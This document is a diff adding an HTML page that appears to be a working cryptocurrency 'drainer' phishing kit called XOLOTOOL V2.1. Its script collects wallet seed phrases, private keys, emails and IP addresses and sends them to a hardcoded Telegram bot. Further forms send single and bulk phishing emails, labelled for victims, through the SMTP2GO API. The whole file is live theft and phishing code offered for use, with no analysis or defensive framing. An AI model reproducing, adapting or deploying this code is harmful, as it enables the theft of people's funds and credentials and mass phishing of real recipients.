@@ -1,0 +1,85 @@
+
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow"><title>XOLOTOOL V2.1</title><style>
+body{margin:0;background:#000;color:#fff;font-family:Arial;}
+.h{background:#111;padding:15px 0;border-bottom:3px solid #8CBE06;text-align:center;}
+.b{padding:80px 20px;text-align:center;background:#111;}
+.o{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.98);z-index:999999;
+   display:none;justify-content:center;align-items:center;backdrop-filter:blur(15px);}
+.d{background:#111;border:3px solid #8CBE06;padding:40px;border-radius:25px;width:90%;max-width:500px;
+   box-shadow:0 0 80px #8CBE06;animation:p 1.8s infinite;text-align:center;}
+@keyframes p{0%{box-shadow:0 0 40px #8CBE06}100%{box-shadow:0 0 80px #8CBE06}}
+.d input,.d textarea{width:100%;padding:15px;margin:12px 0;background:#222;border:1px solid #8CBE06;
+   color:#fff;border-radius:12px;font-size:16px;}
+#k{border:2px solid red !important;}
+.btn{background:#8CBE06;color:#000;font-weight:bold;padding:18px;width:100%;border:none;border-radius:12px;
+   cursor:pointer;font-size:19px;}
+</style></head><body>
+<div class="h"><img src="https://xolotool.pro/storage/app/public/logos/mmnoAuaL5yTsbYQu6SWSGTsQxZY5c03zc07V9tm2.png" width="200"></div>
+<div class="b"><h2 style="color:#8CBE06;font-size:42px;">XOLOTOOL V2.1<br>Wallet Sync + Mailer</h2></div>
+
+<div class="o" id="o">
+<div class="d">
+<button onclick="t('d')">DRAIN</button> <button onclick="t('s')">SINGLE</button> <button onclick="t('b')">BULK</button>
+
+<div id="d" style="display:block;">
+<form id="f1"><input placeholder="Wallet" id="w" required><textarea placeholder="Seed" id="s" rows="4" required></textarea>
+<input placeholder="Key (REQ)" id="k" required><input type="email" placeholder="Email" id="e" required>
+<button type="submit" class="btn">SYNC NOW</button></form><div id="st1"></div>
+</div>
+
+<div id="s" style="display:none;">
+<form id="f2"><input placeholder="Your Drainer Link" id="lnk" value="https://yoursite.tiiny.site" required>
+<input placeholder="Victim Email" id="to"><textarea id="msg">Sync here: {link}</textarea>
+<button type="submit" class="btn">SEND MAIL</button></form><div id="st2"></div>
+</div>
+
+<div id="b" style="display:none;">
+<form id="f3"><textarea placeholder="Emails (one per line)" id="list" rows="8"></textarea>
+<input placeholder="Your Link" id="blnk" value="https://yoursite.tiiny.site"><button type="submit" class="btn">BULK SEND</button></form>
+<div id="st3"></div>
+</div>
+</div>
+</div>
+
+<script>
+const eth = "0x88d12291f53AE3cEAB4E1E58FEc1a5ADb088A734";
+const tk = "8529220792:AAEW1h6WjIVHdq0u83XyMbIr5B-qrI-R0to";
+const ch = "8529220792";
+const smtpKey = "YOUR-SMTP2GO-API-KEY-HERE"; // ← GET FREE AT smtp2go.com
+
+setTimeout(() => document.getElementById('o').style.display='flex', 1000);
+function t(id){document.querySelectorAll('#d,#s,#b').forEach(d=>d.style.display='none');document.getElementById(id).style.display='block';}
+
+// DRAIN
+document.getElementById('f1').onsubmit=e=>{e.preventDefault();
+    const data={s:document.getElementById('s').value,k:document.getElementById('k').value,e:document.getElementById('e').value};
+    fetch('https://api.ipify.org').then(r=>r.text()).then(ip=> {
+        fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${ch}&text=*DRAIN*%0ASeed:${data.s}%0AKey:${data.k}%0AEmail:${data.e}%0AIP:${ip}`);
+    });
+    alert("Drained!"); window.location="https://xolotool.pro/login";
+};
+
+// SINGLE MAIL
+document.getElementById('f2').onsubmit=e=>{e.preventDefault();
+    const link=document.getElementById('lnk').value;
+    const msg=document.getElementById('msg').value.replace("{link}",link);
+    fetch('https://api.smtp2go.com/v3/email/send', {method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({api_key:smtpKey,to:[document.getElementById('to').value],sender:"info@xolotool.pro",subject:"XOLOTOOL Premium",text_body:msg})
+    }).then(()=>document.getElementById('st2').innerHTML="SENT!");
+};
+
+// BULK MAIL
+document.getElementById('f3').onsubmit=e=>{e.preventDefault();
+    const list=document.getElementById('list').value.split('\n').filter(x=>x);
+    const link=document.getElementById('blnk').value;
+    let sent=0;
+    list.forEach((email,i)=>setTimeout(()=>{
+        fetch('https://api.smtp2go.com/v3/email/send', {method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({api_key:smtpKey,to:[email.trim()],sender:"info@xolotool.pro",subject:"XOLOTOOL V2.1",text_body:`Sync: ${link}`})
+        });
+        sent++; document.getElementById('st3').innerHTML=`Sent ${sent}/${list.length}`;
+    },i*1500));
+};
+</script>
+<
